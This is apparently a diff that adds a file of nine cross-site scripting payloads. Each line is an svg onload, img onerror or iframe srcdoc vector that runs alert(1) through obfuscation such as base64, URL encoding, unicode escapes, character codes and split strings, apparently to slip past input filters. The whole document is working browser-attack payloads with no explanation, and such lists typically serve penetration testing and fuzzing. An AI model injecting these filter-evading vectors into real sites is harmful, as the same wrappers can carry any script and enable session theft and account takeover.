@@ -1,0 +1,9 @@
+<svg onload="setTimeout(()=>{window['al'+'ert'](1)},0)">
+<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>"></iframe>
+<svg onload=eval(atob(`YWxlcnQoMSk=`))>
+<iframe srcdoc="<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></iframe>">
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>"></iframe>
